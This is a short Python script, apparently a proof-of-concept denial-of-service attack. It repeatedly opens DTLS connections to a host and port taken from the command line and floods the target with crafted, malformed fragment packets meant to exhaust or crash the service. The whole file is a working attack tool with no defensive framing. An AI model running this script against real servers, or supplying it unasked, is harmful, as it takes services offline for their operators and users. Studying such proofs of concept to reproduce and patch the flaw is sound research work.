import ssl
import struct
import sys
from socket import socket, AF_INET, SOCK_DGRAM
from dtls import do_patch, sslconnection

def open_socket(host, port):
    sock = ssl.wrap_socket(socket(AF_INET, SOCK_DGRAM))
    setattr(sock, "ssl_version", sslconnection.PROTOCOL_DTLSv1)
    sock.connect((host, port))
    return sock

def create_dos_packet(fragment_id, length_of_fragment):
    fragment = "A" * 1000
    _buffer = struct.pack(
        "<HHHHH",
        5,                  # id
        len(fragment) + 6,  # full packet
        fragment_id,        # fragment id
        length_of_fragment, # number of fragments
        1000                # length of a fragment
    )
    _buffer += fragment
    return _buffer

def dos(host, port):
    for i in range(0, 0x1337):
        sock = open_socket(host, port)
        for j in range(0, 4):
            packet = create_dos_packet(i, i)
            sock.write(packet)
        sock.close()

def main():
    do_patch() # applies DTLS patches to openssl
    host = sys.argv[1]
    port = int(sys.argv[2])
    dos(host, port)

if __name__ == "__main__":
    main()